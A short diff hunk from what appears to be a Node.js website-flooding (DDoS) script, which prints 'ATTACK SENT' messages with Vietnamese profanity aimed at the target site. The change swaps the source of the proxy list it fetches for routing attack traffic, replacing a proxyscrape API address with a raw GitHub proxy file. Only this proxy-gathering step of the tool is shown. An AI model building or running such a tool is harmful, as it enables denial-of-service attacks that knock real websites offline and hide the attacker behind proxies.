@@ -38,7 +38,7 @@ async function poptto() {
             console.log("ATTACK SENT ! DOWN CHẾT CON MẸ MÀY ĐI WEBSITE LỎ VCUT")
         } else if (process.argv[5] == 'proxy'){
             console.log("ATTACK SENT ! DOWN CHẾT CON MẸ MÀY ĐI WEBSITE LỎ VCUT")
-            const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
+            const proxyscrape_http = await axios.get('https://raw.githubusercontent.com/datahtkg/datahtkg/main/proxy.txt');
             var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
         } else {
             console.log("ATTACK SENT ! DMT-SCRIPT")
